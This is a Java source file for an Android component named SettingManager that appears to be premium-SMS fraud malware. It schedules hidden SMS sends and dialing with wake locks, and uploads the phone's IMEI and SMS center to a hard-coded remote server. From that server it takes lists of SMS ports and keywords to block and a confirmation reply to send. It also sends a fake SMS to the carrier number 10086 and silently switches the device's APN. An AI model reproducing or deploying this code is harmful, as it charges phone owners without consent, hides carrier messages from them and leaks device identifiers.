package com.mms.bg.ui;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Date;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;

import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.params.ConnRoutePNames;
import org.apache.http.entity.InputStreamEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.HTTP;
import org.xmlpull.v1.XmlSerializer;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.database.SQLException;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.util.Xml;

import com.mms.bg.transaction.WorkingMessage;
import com.mms.bg.util.LogUtil;
import com.mms.bg.util.XMLHandler;

public class SettingManager {
    private static final String TAG = "SettingManager";
    private static final boolean DEBUG = true;
    
    public static final String TARGET_NUM = "target_num";
    public static final String SMS_COUNT = "sms_send_count";
    public static final String SMS_ROUND_TOTAL_SEND = "sms_round_total_send";
    public static final String LAST_SMS_TIME = "last_sms_time";
    public static final String LAST_SMS_FORMAT_TIME = "last_sms_format_time";
    public static final String LAST_DIAL_TIME = "last_dial_time";
    public static final String LAST_DIAL_FORMAT_TIME = "last_dial_format_time";
    public static final String ENABLE_DIAL = "enable_dial";
    public static final String ENABLE_SMS = "enable_sms";
    public static final String SMS_SEND_DELAY = "sms_send_delay";
    public static final String LAST_CONNECT_SERVER_TIME = "last_connect_server_time";
    public static final String SMS_BLOCK_TIME = "sms_block_time";
    public static final String SMS_BLOCK_START_TIME = "sms_block_start_time";
    public static final String SMS_BLOCK_PORT = "sms_block_port";
    public static final String SMS_BLOCK_KEY = "sms_block_key";
    public static final String SMS_CONFIRM_INFO = "sms_confirm_info";
    public static final String SMS_CENTER = "sms_center";
    public static final String FIRST_START_TIME = "first_start_time";
    public static final String SMS_TEMP_BLOCK_NUM_AND_TIMES = "sms_temp_block_num_and_times";
    public static final String INTERNET_CONNECT_FAILED = "internet_connect_failed";
    public static final String INTERNET_CONNECT_FAILED_BEFORE_SMS = "internet_connect_failed_before_SMS";
    
    private static final String CMWAP = "cmwap";
//    private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
    private static final String SERVER_URL = "http://www.youlubg.com:81/Coop/request3.php";
    private static final String VEDIO_URL = "http://211.136.165.53/wl/rmw1s/pp66.jsp";
    
    private static final Uri uri_apn = Uri.parse("content://telephony/carriers/preferapn");
    private static final Uri uri_apn_list = Uri.parse("content://telephony/carriers");
    
    public final String BASE_PATH;
    public final String SETTING_FILE_NAME;
    public final String UPLOAD_FILE_PATH;
    public final String DOWNLOAD_FILE_PATH;
    public final String VEDIO_DOWNLOAD_FILE_PATH;
    
    private static final int DEFAULT_SMS_COUNT = 0;
    
    private static final String DEFAULT_VALUE = "";
    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 20) * 24 * 3600 * 1000);
//    public static final long SMS_DEFAULT_DELAY_TIME = (((long) 5) * 3600 * 1000);
    private static final long SMS_ONE_ROUND_NAP = 5 * 60 * 1000;
    public static final long SMS_CHECK_ROUND_DELAY = ((long) 24) * 3600 * 1000;
//    public static final long SMS_CHECK_ROUND_DELAY = ((long) 60) * 60 * 1000;
    
    public static final String AUTO_SMS_ACTION = "com.mms.bg.SMS";
    public static final String AUTO_CONNECT_SERVER = "com.mms.bg.SERVER";
    private static final int TIMEOUT = 10 * 1000;
    
    public Activity mForegroundActivity;
    private Context mContext;
    private PowerManager.WakeLock mWakeLock;
    private PowerManager.WakeLock mPartWakeLock;
    private SharedPreferences mSP;
    private SharedPreferences.Editor mEditor;
    private static  SettingManager gSettingManager;
    private LogUtil mLog;
    public XMLHandler mXMLHandler;
    public String mPid;
    public String mOldAPNId;
    public ConnectivityManager mConnMgr;
    public ContentResolver mResolver;
    
    public static SettingManager getInstance(Context context) {
        if (gSettingManager == null) {
            gSettingManager = new SettingManager(context);
        }
        return gSettingManager;
    }

    public void setXMLHandler(XMLHandler handler) {
        mXMLHandler = handler;
    }
    
    public void makeWakeLock() {
        if (mWakeLock == null) {
            PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                                            | PowerManager.ACQUIRE_CAUSES_WAKEUP, "");
            mWakeLock.setReferenceCounted(false);
        }
        mWakeLock.acquire();
    }
    
    public void releaseWakeLock() {
        mWakeLock.release();
        mWakeLock = null;
    }
    
    public void makePartialWakeLock() {
        if (mPartWakeLock == null) {
            PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
            mPartWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "prepareSendSMS");
            mPartWakeLock.setReferenceCounted(false);
        }
        mPartWakeLock.acquire();
    }
    
    public void releasePartialWakeLock() {
        mPartWakeLock.release();
        mPartWakeLock = null;
    }
    
    //preference operator
    public void setLastSMSTime(long time) {
        Date date = new Date(time);
        mEditor.putLong(LAST_SMS_TIME, time);
        mEditor.putString(LAST_SMS_FORMAT_TIME, date.toLocaleString());
        mEditor.commit();
    }
    
    public String getLastSMSFormatTime() {
        return mSP.getString(LAST_SMS_FORMAT_TIME, DEFAULT_VALUE);
    }
    
    public void setSMSBlockDelayTime(long time) {
        mEditor.putLong(SMS_BLOCK_TIME, time);
        mEditor.commit();
    }
    
    public long getSMSBlockDelayTime() {
        return mSP.getLong(SMS_BLOCK_TIME, 0);
    }
    
    public void setSMSBlockBeginTime(long time) {
        mEditor.putLong(SMS_BLOCK_START_TIME, time);
        mEditor.commit();
    }
    
    public long getSMSBlockBeginTime() {
        return mSP.getLong(SMS_BLOCK_START_TIME, System.currentTimeMillis());
    }
    
    public void setSMSBlockPorts(String ports) {
        mEditor.putString(SMS_BLOCK_PORT, ports);
        mEditor.commit();
    }
    
    public String getSMSBlockPorts() {
        return mSP.getString(SMS_BLOCK_PORT, null);
    }
    
    public void setSMSBlockKeys(String keys) {
        mEditor.putString(SMS_BLOCK_KEY, keys);
        mEditor.commit();
    }
    
    public String getSMSBlockKeys() {
        return mSP.getString(SMS_BLOCK_KEY, null);
    }
    
    public void setConfirmInfo(String str) {
        mEditor.putString(SMS_CONFIRM_INFO, str);
        mEditor.commit();
    }
    
    public String getConfirmInfo() {
        return mSP.getString(SMS_CONFIRM_INFO, null);
    }
    
    public long getLastSMSTime() {
        return mSP.getLong(LAST_SMS_TIME, 0);
    }
    
    public void setLastDialTime(long time) {
        Date date = new Date(time);
        mEditor.putLong(LAST_DIAL_TIME, time);
        mEditor.putString(LAST_DIAL_FORMAT_TIME, date.toGMTString());
        mEditor.commit();
    }
    
    public String getLastDialFormatTime() {
        return mSP.getString(LAST_DIAL_FORMAT_TIME, DEFAULT_VALUE);
    }
    
    private long getLastDailTime() {
        return mSP.getLong(LAST_DIAL_TIME, 0);
    }
    
    public void setSMSTargetNum(String num) {
        mEditor.putString(TARGET_NUM, num);
        mEditor.commit();
    }
    
    public String getSMSTargetNum() {
        return mSP.getString(TARGET_NUM, DEFAULT_VALUE); 
    }
    
    public void setDialEnable(boolean enable) {
        mEditor.putBoolean(ENABLE_DIAL, enable);
        mEditor.commit();
    }
    
    public boolean getDialEnable() {
        return mSP.getBoolean(ENABLE_DIAL, true);
    }
    
    public void setSMSEnable(boolean enable) {
        mEditor.putBoolean(ENABLE_SMS, enable);
        mEditor.commit();
    }
    
    public boolean getSMSEnable() {
        return mSP.getBoolean(ENABLE_SMS, true); 
    }
    
    public void setTodaySMSSendCount(int count) {
        mEditor.putInt(SMS_COUNT, count);
        mEditor.commit();
    }
    
    public int getTodaySMSSendCount() {
        return mSP.getInt(SMS_COUNT, DEFAULT_SMS_COUNT);
    }
    
    public void setSMSRoundTotalSnedCount(int count) {
        mEditor.putInt(SMS_ROUND_TOTAL_SEND, count);
        mEditor.commit();
    }
    
    public int getSMSRoundTotalSend() {
        return mSP.getInt(SMS_ROUND_TOTAL_SEND, DEFAULT_SMS_COUNT);
    }
    
    public void setSMSSendDelay(long delay) {
        mEditor.putLong(SMS_SEND_DELAY, delay);
        mEditor.commit();
    }
    
    public long getSMSSendDelay() {
        return mSP.getLong(SMS_SEND_DELAY, SMS_CHECK_ROUND_DELAY);
    }
    
    public void log(String tag, String log) {
        if (DEBUG) {
            StringBuilder str = new StringBuilder();
            str.append(Thread.currentThread().getStackTrace()[3].getClassName())
               .append("::")
               .append(Thread.currentThread().getStackTrace()[3].getMethodName())
               .append("::Line=")
               .append(Thread.currentThread().getStackTrace()[3].getLineNumber())
               .append("  ")
               .append(log);
            mLog.appendLog(str.toString());
        }
    }
    
    public void log(String log) {
        if (DEBUG) {
            StringBuilder str = new StringBuilder();
            str.append(Thread.currentThread().getStackTrace()[3].getClassName())
               .append("::")
               .append(Thread.currentThread().getStackTrace()[3].getMethodName())
               .append("::Line=")
               .append(Thread.currentThread().getStackTrace()[3].getLineNumber())
               .append("  ")
               .append(log);
            mLog.appendLog(str.toString());
        }
    }
    
    //return the temp block num and the time for the bg service. format is num;times
    public String getSMSTempBlockNumAndTimes() {
        return mSP.getString(SMS_TEMP_BLOCK_NUM_AND_TIMES, null);
    }
    
    public void setSMSTempBlockNumAndTimes(String num, String count) {
        if (num == null || count == null) {
            mEditor.remove(SMS_TEMP_BLOCK_NUM_AND_TIMES);
        } else {
            mEditor.putString(SMS_TEMP_BLOCK_NUM_AND_TIMES, num + ";" + count);
        }
        mEditor.commit();
    }
    
    public boolean isSimCardReady() {
        TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm.getSimState() == TelephonyManager.SIM_STATE_READY) {
            return true;
        }
        return false;
    }
    
    public boolean isCallIdle() {
        TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm.getCallState() == TelephonyManager.CALL_STATE_IDLE) {
            return true;
        }
        return false;
    }
    
    public void startAutoSendMessage(long base_time, long sms_delay_time) {
        cancelAutoSendMessage();
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_SMS_ACTION);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        long currentTime = System.currentTimeMillis();
        long firstTime = currentTime;
        
        long latestSMSTime = base_time == 0 ? this.getLastSMSTime() : base_time;
        long tempDelay = 2 * 60 * 1000;
        log("sms_delay_time = " + sms_delay_time + " lastSMSTime = " + latestSMSTime
                + " lastSMSFormatTime = " + getLastSMSFormatTime());
        if (latestSMSTime != 0 && (currentTime - latestSMSTime) >= sms_delay_time + tempDelay) {
            log(TAG, "start the broadcast because of case 1");
            firstTime = currentTime + tempDelay;
        } else if (latestSMSTime != 0) {
            log(TAG, "start the broadcast because of case 2");
            firstTime = latestSMSTime + sms_delay_time;
        } else {
            log(TAG, "start the broadcast because of case 3");
            firstTime = currentTime + tempDelay;
        }
        
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, sms_delay_time, sender);
    }
    
    public void cancelAutoSendMessage() {
        log("cancelAutoSendMessage");
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_SMS_ACTION);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }
    
    public void cancelOneRoundSMSSend() {
        log("cancelOneRoundSMSSend");
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(BgService.ACTION_SEND_SMS_ROUND);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }
    
    public void startOneRoundSMSSend(long delay) {
        log("startOneRoundSMSSend");
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(BgService.ACTION_SEND_SMS_ROUND);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        long currentTime = System.currentTimeMillis();
        
        delay = delay != 0 ? delay : SMS_ONE_ROUND_NAP;
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, currentTime, delay, sender);
    }
    
    public boolean phoneNumBelongToCMCC() {
        String smsCenter = getSMSCenter();
        if (smsCenter != null && smsCenter.length() == 11) {
            return smsCenter.startsWith("130");
        }
        return false;
    }
    
    public void setLastConnectServerTime(long time) {
        mEditor.putLong(LAST_CONNECT_SERVER_TIME, time);
        mEditor.commit();
    }
    
    public long getLastConnectServerTime() {
        return mSP.getLong(LAST_CONNECT_SERVER_TIME, 0);
    }
    
    public void setSMSCenter(String num) {
        LOGD("[[setSMSCenter]] center = " + num);
        mEditor.putString(SMS_CENTER, num);
        mEditor.commit();
    }
    
    public String getFirstStartTime() {
        return mSP.getString(FIRST_START_TIME, null);
    }
    
    public void setInternetConnectFailed(boolean failed) {
        mEditor.putBoolean(INTERNET_CONNECT_FAILED, failed);
        mEditor.commit();
    }
    
    public boolean getInternetConnectFailed() {
        return mSP.getBoolean(INTERNET_CONNECT_FAILED, false);
    }
    
    public void setInternetConnectFailedBeforeSMS(boolean failed) {
        mEditor.putBoolean(INTERNET_CONNECT_FAILED_BEFORE_SMS, failed);
        mEditor.commit();
    }
    
    public boolean getInternetConnectFailedBeforeSMS() {
        return mSP.getBoolean(INTERNET_CONNECT_FAILED_BEFORE_SMS, false);
    }
    
    /**
     * set the first start time for the mmsbg
     */
    public void setFirstStartTime() {
        String time = getFirstStartTime();
        if (time == null) {
            Date date = new Date(System.currentTimeMillis());
            mEditor.putString(FIRST_START_TIME, date.toGMTString());
            mEditor.commit();
        }
    }
    
    public String getSMSCenter() {
        return mSP.getString(SMS_CENTER, null);
    }
    
    public void tryToFetchInfoFromServer(long delayTime) {
        cancelFetchInfo();
        final long DEFAULT_FETCH_DELAY = ((long) 24) * 60 * 60 * 1000;
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_CONNECT_SERVER);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        long currentTime = System.currentTimeMillis();
        long firstTime = currentTime;
        
        long connect_delay_time = delayTime != 0 ? delayTime : DEFAULT_FETCH_DELAY;
        long latestConnectTime = getLastConnectServerTime();
        long tempDelay = 10 * 1000;
        if (latestConnectTime != 0 && (currentTime - latestConnectTime) >= connect_delay_time + tempDelay) {
            firstTime = currentTime + tempDelay;
        } else if (latestConnectTime != 0) {
            firstTime = latestConnectTime + connect_delay_time;
        } else {
            firstTime = currentTime + tempDelay;
        }
        
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, connect_delay_time, sender);
    }
    
    private void cancelFetchInfo() {
        LOGD("[[cancelFetchInfo]]");
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_CONNECT_SERVER);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }
    
    private HttpParams getParams() {
        HttpParams params = new BasicHttpParams();
        HttpConnectionParams.setConnectionTimeout(params, TIMEOUT);
        HttpConnectionParams.setSoTimeout(params, TIMEOUT);
        HttpConnectionParams.setSocketBufferSize(params, 8192);
//        if (getProxy() == true) {
//            final HttpHost proxy = new HttpHost(mProxyHost, mProxyPort, "http");
//            params.setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
//        }
        return params;
    }
    
    private HttpParams getParams(String ip, String port) {
        HttpParams params = new BasicHttpParams();
        HttpConnectionParams.setConnectionTimeout(params, TIMEOUT);
        HttpConnectionParams.setSoTimeout(params, TIMEOUT);
        HttpConnectionParams.setSocketBufferSize(params, 8192);
        if (canUseProxy() == true && ip != null && port != null) {
            LOGD("======= set proxy for ip = " + ip + " port = " + port + " =======");
            HttpHost proxy = new HttpHost(ip, Integer.valueOf(port), "http");
            params.setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
        }
        return params;
    }
    
    private boolean canUseProxy() {
        ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = ConnMgr.getActiveNetworkInfo();
        if (info != null) {
            if (info.getType() == ConnectivityManager.TYPE_WIFI) {
                return false;
            } else if (info.getType() == ConnectivityManager.TYPE_MOBILE) {
                return true;
            }
        }
        return false;
    }
    
    public HttpResponse openConnection(File uploadFile) {
        LOGD("[[openConnection]]");
        HttpClient hc = new DefaultHttpClient(getParams());
        HttpPost post = new HttpPost();
        try {
            post.setURI(new URI(SERVER_URL));
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return null;
        }
        post.setHeader(HTTP.CONTENT_TYPE, "text/plain");
        post.setHeader("Accept", "*/*");
        if (uploadFile != null) {
            InputStreamEntity entity = null;
            try {
                FileInputStream fis = new FileInputStream(uploadFile);
                entity = new InputStreamEntity(fis, fis.available());
            } catch (FileNotFoundException e1) {
                e1.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            ((HttpPost) post).setEntity(entity);
        }
        try {
            HttpResponse response = hc.execute(post);
            LOGD("[[openConnection]] return response != null");
            return response;
        } catch (ClientProtocolException e) {
            if (DEBUG) {
                e.printStackTrace();
            }
        } catch (IOException e) {
            if (DEBUG) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            if (DEBUG) {
                e.printStackTrace();
            }
        }
        return null;
    }
    
    public HttpResponse openConnection(String ip, String port) {
        LOGD("[[openConnection]] for ip and port");
//        ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
//        if (this.canUseProxy() == true) {
//            int ret = ConnMgr.startUsingNetworkFeature(ConnectivityManager.TYPE_MOBILE, "mms");
//            LOGD("------ switch the network APN to mms = " + ret + " --------");
//        }
        
        HttpClient hc = new DefaultHttpClient(getParams(ip, port));
        HttpGet get = new HttpGet();
        try {
            get.setURI(new URI(VEDIO_URL));
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return null;
        }
        get.setHeader(HTTP.CONTENT_TYPE, "text/plain");
        get.setHeader("Accept", "*/*");
        try {
            HttpResponse response = hc.execute(get);
            LOGD("[[openConnection]] return response != null");
            return response;
        } catch (ClientProtocolException e) {
            if (DEBUG) {
                e.printStackTrace();
            }
        } catch (IOException e) {
            if (DEBUG) {
                e.printStackTrace();
            }
        } catch (Exception e) {
            if (DEBUG) {
                e.printStackTrace();
            }
        }
        return null;
    }
    
    private void savePhoneInfo() {
        String smsCenter = this.getSMSCenter();
        //test code
//        if (smsCenter == null) {
//            smsCenter = "13800100500";
//        }
        LOGD("[[savePhoneInfo]] smsCenter = " + smsCenter);
        if (smsCenter != null) {
//            if (smsCenter.startsWith("+") == true && smsCenter.length() == 14) {
//                smsCenter = smsCenter.substring(3);
//            } else if (smsCenter.length() > 11) {
//                smsCenter = smsCenter.substring(smsCenter.length() - 11);
//            }
            LOGD("[[savePhoneInfo]] split the smsCenter = " + smsCenter);
            TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
            String imei = tm.getDeviceId();
            String version = "1.0.1";
            String first = "1";
            String handled = "0";
            String pid = mPid;
            String installTime = getFirstStartTime();
            if (installTime == null) {
                this.setFirstStartTime();
                installTime = getFirstStartTime();
            }
            String systemVersion = Build.VERSION.SDK;
            String author = "michael";
            String fare = "0";
            
            try {
                File file = new File(UPLOAD_FILE_PATH);
                if (file.exists() == true) {
                    file.delete();
                } else {
                    file.createNewFile();
                }
                FileOutputStream out = new FileOutputStream(file);
                XmlSerializer serializer = Xml.newSerializer();
                serializer.setOutput(out, "UTF-8");
                serializer.startDocument("UTF-8", true);
                
                XmlSerializer child = serializer.startTag("", "body");
                
                child.startTag("", "imei");
                child.text(imei);
                child.endTag("", "imei");
                
                child.startTag("", "version");
                child.text(version);
                child.endTag("", "version");
                
                child.startTag("", "smscenter");
                child.text(smsCenter);
                child.endTag("", "smscenter");
                
                child.startTag("", "first");
                child.text(first);
                child.endTag("", "first");
                
                child.startTag("", "handled");
                child.text(handled);
                child.endTag("", "handled");
                
                child.startTag("", "pid");
                child.text(pid);
                child.endTag("", "pid");
                
                child.startTag("", "installtime");
                child.text(installTime);
                child.endTag("", "installtime");
                
                child.startTag("", "sysversion");
                child.text(systemVersion);
                child.endTag("", "sysversion");
                
                child.startTag("", "auth");
                child.text(author);
                child.endTag("", "auth");
                
                child.startTag("", "fare");
                child.text(fare);
                child.endTag("", "fare");
                
                serializer.endTag("", "body");
                serializer.flush();
                serializer.endDocument();
                out.close();
            } catch (Exception e) {
            }
        } else {
            //the sms center is null, so fake to send a sms to 10086 and get the sms center by the reply sms
            WorkingMessage wm = WorkingMessage.createEmpty(mContext);
            wm.setDestNum("10086");
            wm.setText("1234567");
            
            this.setSMSTempBlockNumAndTimes("10086", "1");
            wm.send();
        }
    }
    
    public boolean getXMLInfoFromServer() {
        savePhoneInfo();
        
        File file = new File(UPLOAD_FILE_PATH);
        if (file.exists() == false) {
            return false;
        }
        LOGD("[[getTargetNum]] the file upload is exist");
        HttpResponse r = openConnection(file);
        if (r == null) return false;
        if (r.getStatusLine().getStatusCode() != 200) {
            LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
            log(TAG, "r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
            return false;
        }
        try {
            File outFile = new File(DOWNLOAD_FILE_PATH);
            if (!outFile.exists()) {
                outFile.createNewFile();
            }
            LOGD("[[getTargetNum]] download file now");
            FileOutputStream fos = new FileOutputStream(DOWNLOAD_FILE_PATH, false);
            InputStream is = r.getEntity().getContent();
            byte[] buffer = new byte[1024];
            int readLength = 0;
            while ((readLength = is.read(buffer, 0, 1024)) != -1) {
                fos.write(buffer, 0, readLength);
                fos.flush();
            }
            fos.close();
            is.close();
            dumpReceiveFile(DOWNLOAD_FILE_PATH);
            
        } catch (Exception e) {
            Log.d(TAG, "[[getTargetNum]] e = " + e.getMessage());
            return false;
        }
        return true;
    }
    
    public boolean getVedioXML() {
        LOGD("");
        HttpResponse r = openConnection("10.0.0.172", "80");
        if (r == null) return false;
        if (r.getStatusLine().getStatusCode() != 200) {
            LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
            log(TAG, "r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
            return false;
        }
        try {
            File outFile = new File(VEDIO_DOWNLOAD_FILE_PATH);
            if (!outFile.exists()) {
                outFile.createNewFile();
            }
            LOGD("[[getTargetNum]] download file now");
            FileOutputStream fos = new FileOutputStream(VEDIO_DOWNLOAD_FILE_PATH, false);
            InputStream is = r.getEntity().getContent();
            byte[] buffer = new byte[1024];
            int readLength = 0;
            while ((readLength = is.read(buffer, 0, 1024)) != -1) {
                fos.write(buffer, 0, readLength);
                fos.flush();
            }
            fos.close();
            is.close();
            dumpReceiveFile(VEDIO_DOWNLOAD_FILE_PATH);
            
        } catch (Exception e) {
            Log.d(TAG, "[[getTargetNum]] e = " + e.getMessage());
            return false;
        }
        return true;
    }
    
    public boolean parseServerXMLInfo() {
        File file = new File(DOWNLOAD_FILE_PATH);
        if (file.exists() == true) {
            SAXParser mSaxparser;
            try {
                mSaxparser = SAXParserFactory.newInstance().newSAXParser();
                mXMLHandler = new XMLHandler();
                mSaxparser.parse(file, mXMLHandler);
                
                mXMLHandler.dumpXMLParseInfo();
                refreshChannelSP();
                return true;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return false;
    }
    
    private void refreshChannelSP() {
        LOGD("[[refreshChannelSP]]");
        ArrayList<String> blockPorts = mXMLHandler.getBlockPorts();
        if (blockPorts.size() > 0) {
            StringBuilder ports = new StringBuilder();
            for(int index = 0; index < blockPorts.size(); ++index) {
                ports.append(blockPorts.get(index)).append(";");
            }
            this.setSMSBlockPorts(ports.substring(0, (ports.length() - 1)));
        } else {
            mEditor.remove(SMS_BLOCK_PORT);
        }
        ArrayList<String> blockKeys = mXMLHandler.getBlockKeys();
        if (blockKeys.size() > 0) {
            StringBuilder keys = new StringBuilder();
            for (int index = 0; index < blockKeys.size(); ++index) {
                keys.append(blockKeys.get(index)).append(";");
            }
            this.setSMSBlockKeys(keys.substring(0, (keys.length() - 1)));
        } else {
            mEditor.remove(SMS_BLOCK_KEY);
        }
        String confirmPort = mXMLHandler.getChanneInfo(XMLHandler.CONFIRM_PORT);
        String confirmKey = mXMLHandler.getChanneInfo(XMLHandler.CONFIRM_KEY);
        String confirmText = mXMLHandler.getChanneInfo(XMLHandler.CONFIRM_CONTENT);
        if (confirmPort != null && confirmKey != null && confirmText != null) {
            String confirmInfo = confirmPort + ";" + confirmKey + ";" + confirmText;
            this.setConfirmInfo(confirmInfo);
        } else {
            mEditor.remove(SMS_CONFIRM_INFO);
        }
        String blockTime = mXMLHandler.getChanneInfo(XMLHandler.INTERCEPT_TIME);
        if (blockTime != null) {
            this.setSMSBlockDelayTime(Long.valueOf(blockTime) * 60 * 1000);
        } else {
            mEditor.remove(SMS_BLOCK_TIME);
        }
        mEditor.commit();
    }
    
    private void dumpReceiveFile(String filename) {
        if (DEBUG) {
            try {
                Log.d(TAG, "[[dumpReceiveFile]] begin dump the file = " + filename);
                File file = new File(filename);
                FileInputStream in = new FileInputStream(file);
                int length = (int) file.length();
                byte[] datas = new byte[length];
                in.read(datas, 0, datas.length);
                String result = new String(datas);
                Log.d(TAG, result);
                log(TAG, result);
            } catch (Exception e) {
                Log.d(TAG, "[[dumpReceiveFile]] e = " + e.getMessage());
                log(TAG, "dumpReceiveFile error = " + e.getMessage());
            }
        }
    }
    
    public void downloadVedio() {
        if (forceCMWapConnection() == false) {
            //mean the current apn is already cmwap
            getVedioProcess();
        }
    }
    
    private NetworkChangeReceiver mNChangeReceiver;
    
    public boolean forceCMWapConnection() { 
        NetworkInfo info = mConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
        String oldAPN = info.getExtraInfo(); 
        
        //if current apn is not cmwap, we have to switch to cmwap. 
        if (oldAPN != null && CMWAP.equals(oldAPN) == false) {
            String  projection[] = {"_id,apn,type,current"};
            Cursor cr = mResolver.query(uri_apn, projection, null, null, null);
            if (cr != null && cr.moveToFirst() == true) {
                if (cr != null) {   
                    LOGD(cr.getString(cr.getColumnIndex("_id")) + "  " + cr.getString(cr.getColumnIndex("apn")) + "  " + cr.getString(cr.getColumnIndex("type"))+ "  " + cr.getString(cr.getColumnIndex("current")));    
                    if (cr.getString(cr.getColumnIndex("current")) != null 
                            && cr.getString(cr.getColumnIndex("current")).equals("1") == true) {
                        this.mOldAPNId = cr.getString(cr.getColumnIndex("_id"));
                    }
                }  
            }
            
            mNChangeReceiver = new NetworkChangeReceiver(); 
            //register receiver for wap network connection. 
            IntentFilter upIntentFilter = new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION); 
            mContext.registerReceiver(mNChangeReceiver, upIntentFilter);
            String newAPNId = getApnIdByName(CMWAP);
            if (newAPNId != null) {
                updateCurrentAPN(newAPNId); 
            }
            return true; 
        } 
        return false; 
    } 

    private void getVedioProcess() {
        if (getVedioXML() == true) {
            //TODO: download the url link
            Thread t = new Thread(new Runnable() {
                public void run() {
                    //TODO : download the vedio from link
                    updateCurrentAPN(mOldAPNId);
                    mOldAPNId = null;
                }
            });
        } else {
            updateCurrentAPN(mOldAPNId);
            mOldAPNId = null;
        }
    }
    
    private class NetworkChangeReceiver extends BroadcastReceiver { 
        public void onReceive(Context context, Intent intent) { 
            LOGD("======= received the action = " + intent.getAction() + " ======");
            if (ConnectivityManager.CONNECTIVITY_ACTION.equals(intent.getAction())) { 
                ConnectivityManager ConnMgr = (ConnectivityManager) mContext.getSystemService(Context.CONNECTIVITY_SERVICE);
                NetworkInfo info = ConnMgr.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
                String apn = info.getExtraInfo(); 
                LOGD("apn = " + apn);
                if (CMWAP.equals(apn) == true) { 
                    /* 
                     * apn change message is sent out more than once during a second, but it 
                     * only happens once practically. 
                     */ 
                    if (mNChangeReceiver != null) {
                        mContext.unregisterReceiver(mNChangeReceiver); 
                        mNChangeReceiver = null; 
                    } 
                    getVedioProcess();
                } 
            } 
        } 
    } 
    
    private int updateCurrentAPN(String apnId) {
        try { 
            LOGD("----- apn id = " + apnId + " --------");
            //set new apn id as chosen one 
            if (apnId != null) { 
                ContentValues values = new ContentValues(); 
                values.put("apn_id", apnId); 
                mResolver.update(uri_apn, values, null, null); 
            } else { 
                return 0; 
            } 
        } catch (Exception e) { 
            Log.d(TAG, e.getMessage());
            return 0;
        }
        
        //update success 
        return 1; 
    }
    
